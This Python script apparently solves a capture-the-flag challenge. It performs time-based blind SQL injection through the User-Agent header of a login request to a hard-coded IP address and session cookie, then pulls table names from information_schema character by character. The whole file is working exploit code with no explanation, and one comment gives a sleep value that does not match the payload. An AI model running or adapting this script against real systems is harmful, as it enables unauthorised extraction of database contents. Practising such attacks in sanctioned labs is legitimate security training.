import requests
import time

# Target URL and session cookie
url = "http://46.250.232.141:8001/"
cookie = {"PHPSESSID": "64a091994a2cc417601352088df6eae8"}

# Database name retrieved earlier
database_name = "ctf"

# Payloads and headers
def inject(offset, position, char):
    payload = f"' OR IF(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='{database_name}' LIMIT {offset},1),{position},1)='{char}', SLEEP(7), 0), 'aaa')#"
    headers = {
        "User-Agent": payload,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": url,
        "Referer": url,
    }
    data = {"username": "okmyst", "password": "okmyst", "action": "login"}
    return headers, data

# Extract table names
def extract_tables():
    tables = []
    offset = 0
    while True:
        table_name = ""
        for position in range(1, 50):  # Adjust max length as needed
            for char in "abcdefghijklmnopqrstuvwxyz0123456789_":  # Possible characters
                headers, data = inject(offset, position, char)

                # Measure the response time
                start_time = time.time()
                response = requests.post(url, headers=headers, data=data, cookies=cookie)
                elapsed_time = time.time() - start_time

                # Check if the condition caused a delay
                if elapsed_time > 4:  # Delay threshold (SLEEP(10))
                    table_name += char
                    print(f"Found character at position {position} in table {offset}: {char}")
                    break
            else:
                # Stop if no character is found (end of name)
                if table_name:
                    tables.append(table_name)
                break
        if not table_name:
            # Stop if no more tables are found
            break
        offset += 1
    print(f"Extracted tables: {tables}")

if __name__ == "__main__":
    extract_tables()
